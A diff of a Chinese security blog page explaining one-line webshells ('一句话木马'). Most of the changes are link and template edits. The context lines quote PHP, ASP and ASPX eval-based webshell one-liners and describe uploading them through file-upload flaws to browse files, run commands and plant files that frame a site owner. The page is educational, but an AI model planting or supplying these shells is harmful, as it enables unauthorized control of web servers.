@@ -5,18 +5,18 @@
   
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <link rel="dns-prefetch" href="http://example.com">
+  <link rel="dns-prefetch" href="https://example.com">
   <title>一句话木马 | Solkatt的小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="一句话木马概述一句话木马又被称为Webshell，是为了到目前web服务目录继而提权获得系统权限，不论asp，php，jsp，aspx都是如此，那么一句话木马到底是什么呢？ 最简单的一句话木马：  基本原理为利用文件上传漏洞，往目标网站中上传一句话木马，然后就可以在本地通过软件获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval()函数表示括号内的语句字符串什么的全都当作代码执行。$">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一句话木马">
-<meta property="og:url" content="http://example.com/2021/08/04/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/index.html">
+<meta property="og:url" content="https://example.com/2021/08/04/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/index.html">
 <meta property="og:site_name" content="Solkatt的小窝">
 <meta property="og:description" content="一句话木马概述一句话木马又被称为Webshell，是为了到目前web服务目录继而提权获得系统权限，不论asp，php，jsp，aspx都是如此，那么一句话木马到底是什么呢？ 最简单的一句话木马：  基本原理为利用文件上传漏洞，往目标网站中上传一句话木马，然后就可以在本地通过软件获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval()函数表示括号内的语句字符串什么的全都当作代码执行。$">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-08-04T03:01:12.000Z">
-<meta property="article:modified_time" content="2022-01-17T05:52:04.715Z">
+<meta property="article:modified_time" content="2022-01-18T09:59:15.210Z">
 <meta property="article:author" content="Solkatt">
 <meta property="article:tag" content="web安全的杂杂恋">
 <meta name="twitter:card" content="summary">
@@ -80,13 +80,9 @@
 				
 					<a class="github" target="_blank" href="https://github.com/Liudeguang" title="github"><i class="icon-github"></i></a>
 		        
-					<a class="weibo" target="_blank" href="#" title="weibo"><i class="icon-weibo"></i></a>
-		        
-					<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
-		        
 					<a class="zhihu" target="_blank" href="#" title="zhihu"><i class="icon-zhihu"></i></a>
 		        
-					<a class="qq" target="_blank" href="/595597469" title="qq"><i class="icon-qq"></i></a>
+					<a class="qq" target="_blank" href="http://wpa.qq.com/msgrd?v=3&uin=595597469&site=qq&menu=yes" title="qq"><i class="icon-qq"></i></a>
 		        
 					<a class="mail" target="_blank" href="mailto:595597469@qq.com" title="mail"><i class="icon-mail"></i></a>
 		        
@@ -123,13 +119,9 @@
 					
 						<a class="github" target="_blank" href="https://github.com/Liudeguang" title="github"><i class="icon-github"></i></a>
 			        
-						<a class="weibo" target="_blank" href="#" title="weibo"><i class="icon-weibo"></i></a>
-			        
-						<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
-			        
 						<a class="zhihu" target="_blank" href="#" title="zhihu"><i class="icon-zhihu"></i></a>
 			        
-						<a class="qq" target="_blank" href="/595597469" title="qq"><i class="icon-qq"></i></a>
+						<a class="qq" target="_blank" href="http://wpa.qq.com/msgrd?v=3&uin=595597469&site=qq&menu=yes" title="qq"><i class="icon-qq"></i></a>
 			        
 						<a class="mail" target="_blank" href="mailto:595597469@qq.com" title="mail"><i class="icon-mail"></i></a>
 			        
@@ -184,6 +176,8 @@
 <h2 id="常见形式"><a href="#常见形式" class="headerlink" title="常见形式"></a>常见形式</h2><p>常见的一句话木马：</p>
 <p>php的一句话木马： <?php @eval($_POST['pass']);?><br>asp的一句话是：   &lt;%eval request (“pass”)%&gt;<br>aspx的一句话是：  &lt;%@ Page Language=”Jscript”%&gt; &lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;</p>
 <p>我们可以直接将这些语句插入到网站上的某个asp/aspx/php文件上，或者直接创建一个新的文件，在里面写入这些语句，然后把文件上传到网站上即可。</p>
+<span id="more"></span>
+
 <h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>eval函数将字符串作为php代码执行。post使服务器接受变量cmd，所以该一句话木马的含义九尾把变量cmd里面的字符串当作php代码来执行。也就是说，想执行什么代码，就把什么代码放进cmd里，用post传输给一句话木马。你想查看目标硬盘里有没有小黄片，可以用php函数：<code>opendir()</code>和<code>readdir()</code>等等。想上传点小黄片，诬陷站主，就用php函数：<code>move_uploaded_file</code>，当然相应的html要写好。你想执行cmd命令，则用<code>exec()</code>。</p>
@@ -265,7 +259,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/08/04/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://example.com/2021/08/04/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -488,7 +482,7 @@ MathJax.Hub.Queue(function() {
     
     	<section class="tools-section tools-section-me" q-show="aboutme">
   	  	
-  	  		<div class="aboutme-wrap" id="js-aboutme">一个菜鸡的成长之路&lt;br&gt;&lt;br&gt;平荒尽处是春山&lt;br&gt;Life is a fucking movie.</div>
+  	  		<div class="aboutme-wrap" id="js-aboutme">&lt;br&gt;&lt;br&gt;平荒尽处是春山&lt;br&gt;Life is a fucking movie.</div>
   	  	
     	</section>
     
